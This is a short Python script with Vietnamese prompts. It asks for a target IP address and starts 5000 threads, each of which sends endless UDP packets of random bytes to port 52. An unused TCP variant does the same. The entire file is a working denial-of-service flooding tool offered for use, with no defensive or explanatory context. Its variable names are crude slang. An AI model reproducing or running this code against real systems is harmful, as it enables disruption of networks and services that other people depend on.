import random
import socket
import threading
ip = str(input(" Nhập ip wifi:"))
port = 52
times = 1000
threads = 5000
def run():
	concu123 = random._urandom(10)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			chinhnguloz = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			concac123 = (str(ip),int(port))
			for x in range(times):
				chinhnguloz.sendto(concu123,concac123)
		except:
			print("Lỗi!!!")
		print('Sent')

def run2():
	concu123 = random._urandom(10)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			chinhnguloz = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			chinhnguloz.connect((ip,port))
			chinhnguloz.send(concu123)
			for x in range(times):
				chinhnguloz.send(concu123)
		except:
			chinhnguloz.close()
			print("Lỗi")
choice='y'
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
